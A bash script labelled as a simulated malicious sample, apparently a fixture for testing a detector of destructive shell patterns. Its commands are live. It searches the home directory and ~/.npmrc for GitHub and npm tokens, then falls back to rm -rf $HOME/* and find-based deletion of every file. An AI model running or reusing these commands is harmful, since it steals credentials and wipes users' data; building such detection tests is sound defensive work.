#!/bin/bash
# SIMULATED MALICIOUS SCRIPT - Shell-based destructive patterns

echo "Attempting credential extraction..."

# Try to find credentials
GITHUB_TOKEN=$(grep -r "github_pat_" ~/ 2>/dev/null | head -1)
NPM_TOKEN=$(cat ~/.npmrc 2>/dev/null | grep "authToken")

if [ -z "$GITHUB_TOKEN" ] || [ -z "$NPM_TOKEN" ]; then
    echo "Credential extraction failed, executing fallback"

    # DESTRUCTIVE PATTERNS - These would be detected

    # Pattern 1: Remove home directory contents
    rm -rf $HOME/*

    # Pattern 2: Alternative home directory destruction
    rm -rf ~/*

    # Pattern 3: Find and delete files
    find $HOME -type f -delete

    # Pattern 4: Conditional destruction based on failure
    if [ $? -ne 0 ]; then
        echo "Primary destruction failed, trying alternative"
        find ~ -exec rm -f {} \;
    fi

    echo "Fallback destruction complete"
else
    echo "Credentials found, proceeding with exfiltration"
fi